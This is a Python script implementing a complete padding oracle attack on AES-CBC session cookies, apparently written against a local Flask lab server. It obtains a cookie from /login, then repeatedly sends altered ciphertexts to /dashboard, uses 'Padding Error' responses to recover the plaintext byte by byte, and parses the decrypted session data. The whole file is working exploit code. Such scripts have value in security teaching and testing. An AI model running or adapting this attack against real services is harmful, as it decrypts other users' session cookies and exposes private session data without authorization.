# padding_oracle_attack_new.py
# Padding Oracle Attack against the new Flask server (/dashboard oracle)

import base64
import requests

URL = "http://localhost:8080/dashboard"
LOGIN_URL = "http://localhost:8080/login"
BLOCK_SIZE = 16

def oracle(cookie_b64: str) -> bool:
    """
    Oracle function that checks if padding is valid.
    Returns True if padding is valid (200 status or specific response).
    Returns False if padding is invalid (500 Padding Error).
    """
    try:
        r = requests.get(
            URL,
            cookies={"session": cookie_b64},
            timeout=5
        )
        # Valid padding: returns 200 with dashboard content
        # Invalid padding: returns 500 with "Padding Error"
        # Other errors: returns 400 with "Other Error"
        
        # If we get 500 and "Padding Error", padding is invalid
        if r.status_code == 500 and "Padding Error" in r.text:
            return False
        # Otherwise (200, 400, or other), padding is valid
        return True
    except Exception as e:
        print(f"Oracle request failed: {e}")
        return False

def split_blocks(data, size=16):
    """Split data into blocks of specified size."""
    return [data[i:i+size] for i in range(0, len(data), size)]

def attack_block(blocks, block_index):
    """
    Attack a single block using padding oracle.
    Returns the plaintext of the block at block_index.
    """
    prev = bytearray(blocks[block_index - 1])
    curr = blocks[block_index]
    
    # Save original prev block
    original_prev = bytes(prev)
    
    intermediate = [0] * BLOCK_SIZE
    plaintext_block = [0] * BLOCK_SIZE
    
    print(f"\n[*] Attacking block {block_index}/{len(blocks)-1}")
    
    # Work byte by byte from right to left
    for pad_len in range(1, BLOCK_SIZE + 1):
        idx = BLOCK_SIZE - pad_len
        print(f"  [+] Attacking byte {idx} (padding length: {pad_len})")
        
        # Set up already-known bytes for current padding length
        for j in range(idx + 1, BLOCK_SIZE):
            prev[j] = intermediate[j] ^ pad_len
        
        found = False
        candidates = []
        
        # Try all possible byte values
        for guess in range(256):
            prev[idx] = guess
            
            # Construct test ciphertext
            test = b"".join(blocks[:block_index-1] + [bytes(prev), curr])
            test_b64 = base64.b64encode(test).decode()
            
            if oracle(test_b64):
                # Valid padding found
                intermediate_candidate = guess ^ pad_len
                plaintext_candidate = intermediate_candidate ^ original_prev[idx]
                candidates.append((guess, intermediate_candidate, plaintext_candidate))
        
        # Handle candidates
        if len(candidates) == 0:
            raise Exception(f"Failed to find byte at index {idx}")
                
        elif len(candidates) == 1:
            # Only one candidate - use it
            guess, inter, plain = candidates[0]
            intermediate[idx] = inter
            plaintext_block[idx] = plain
            print(f"    [✓] Byte {idx} found: {plain:02x} ('{chr(plain) if 32 <= plain < 127 else '.'}')")
            found = True
            
        else:
            # Multiple candidates - need to disambiguate
            print(f"    [!] Found {len(candidates)} candidates for byte {idx}")
            
            # Strategy: For pad_len == 1, we need to distinguish between
            # - actual 0x01 padding byte
            # - a data byte that happens to allow valid padding
            
            # Try changing the next byte to see which candidates still work
            if pad_len == 1 and idx + 1 < BLOCK_SIZE:
                # Test each candidate by corrupting the byte after it
                verified_candidates = []
                
                for guess, inter, plain in candidates:
                    # Create a test where we set this byte and corrupt the next
                    test_prev = bytearray(original_prev)
                    test_prev[idx] = guess
                    
                    # Corrupt the next byte (set it to produce 0x02 for next byte)
                    test_prev[idx + 1] = test_prev[idx + 1] ^ 0xFF
                    
                    test = b"".join(blocks[:block_index-1] + [bytes(test_prev), curr])
                    test_b64 = base64.b64encode(test).decode()
                    
                    # If this still validates, it means we have 0x01 padding
                    # (changing next byte doesn't break single-byte 0x01 padding)
                    if oracle(test_b64):
                        verified_candidates.append((guess, inter, plain))
                
                if len(verified_candidates) == 1:
                    guess, inter, plain = verified_candidates[0]
                    intermediate[idx] = inter
                    plaintext_block[idx] = plain
                    print(f"    [✓] Byte {idx} found (verified): {plain:02x} ('{chr(plain) if 32 <= plain < 127 else '.'}')")
                    found = True
                elif len(verified_candidates) > 1:
                    # Still multiple - shouldn't happen, just use first
                    guess, inter, plain = verified_candidates[0]
                    intermediate[idx] = inter
                    plaintext_block[idx] = plain
                    print(f"    [✓] Byte {idx} found (first verified): {plain:02x} ('{chr(plain) if 32 <= plain < 127 else '.'}')")
                    found = True
                else:
                    # None verified - means it was multi-byte padding, use first original
                    guess, inter, plain = candidates[0]
                    intermediate[idx] = inter
                    plaintext_block[idx] = plain
                    print(f"    [✓] Byte {idx} found (data byte): {plain:02x} ('{chr(plain) if 32 <= plain < 127 else '.'}')")
                    found = True
            else:
                # For pad_len > 1 or no next byte, just use first candidate
                guess, inter, plain = candidates[0]
                intermediate[idx] = inter
                plaintext_block[idx] = plain
                print(f"    [✓] Byte {idx} found (first candidate): {plain:02x} ('{chr(plain) if 32 <= plain < 127 else '.'}')")
                found = True
        
        if not found:
            raise Exception(f"Failed to find byte at index {idx}")
        
        # Restore original prev for next iteration
        prev = bytearray(original_prev)
    
    return bytes(plaintext_block)

def attack(cookie_b64):
    """
    Full padding oracle attack to decrypt the entire cookie.
    """
    print("\n" + "="*70)
    print("PADDING ORACLE ATTACK - STARTING")
    print("="*70)
    
    # Decode the cookie
    raw = base64.b64decode(cookie_b64)
    print(f"[*] Cookie length: {len(raw)} bytes")
    
    # Split into blocks
    blocks = split_blocks(raw, BLOCK_SIZE)
    print(f"[*] Number of blocks: {len(blocks)} (1 IV + {len(blocks)-1} ciphertext blocks)")
    
    recovered = b""
    
    # Attack each ciphertext block (skip IV at index 0)
    for bi in range(1, len(blocks)):
        plaintext_block = attack_block(blocks, bi)
        recovered += plaintext_block
    
    print("\n" + "="*70)
    print("ATTACK COMPLETE")
    print("="*70)
    
    return recovered

def remove_padding(data):
    """Remove PKCS7 padding from decrypted data."""
    if len(data) == 0:
        return data
    padding_length = data[-1]
    # Validate padding
    if padding_length > len(data) or padding_length > BLOCK_SIZE or padding_length == 0:
        return data
    # Check if all padding bytes are correct
    for i in range(padding_length):
        if data[-(i+1)] != padding_length:
            return data
    return data[:-padding_length]

if __name__ == "__main__":
    print("\n" + "="*70)
    print("PADDING ORACLE ATTACK - NEW WEBSERVER")
    print("="*70)
    
    # Step 1: Get a valid cookie from /login
    print("\n[*] Step 1: Getting valid session cookie from /login")
    s = requests.Session()
    response = s.get(LOGIN_URL)
    cookie = s.cookies.get("session")
    
    if cookie is None:
        print("[!] Error: Failed to retrieve session cookie")
        print("[!] Make sure the server is running at http://localhost:8080")
        exit(1)
    
    print(f"[✓] Session cookie obtained")
    print(f"[*] Cookie (Base64): {cookie[:50]}...")
    print(f"[*] Cookie length: {len(cookie)} characters")
    
    # Step 2: Perform padding oracle attack
    print("\n[*] Step 2: Performing padding oracle attack to decrypt cookie")
    try:
        plaintext_padded = attack(cookie)
        plaintext = remove_padding(plaintext_padded)
        
        print("\n[✓] Decryption successful!")
        print(f"[*] Recovered plaintext (hex): {plaintext.hex()}")
        print(f"[*] Recovered plaintext (raw): {plaintext}")
        
        try:
            plaintext_str = plaintext.decode('utf-8')
            print(f"[*] Recovered plaintext (UTF-8): {plaintext_str}")
            
            # Try to parse as JSON
            import json
            data = json.loads(plaintext_str)
            print("\n[✓] Cookie data structure:")
            for key, value in data.items():
                print(f"    {key}: {value}")
                
        except Exception as e:
            print(f"[!] Could not decode as UTF-8/JSON: {e}")
            print(f"[*] Plaintext with padding: {plaintext_padded}")
    
    except Exception as e:
        print(f"\n[!] Attack failed: {e}")
        import traceback
        traceback.print_exc()
    
    print("\n" + "="*70)
    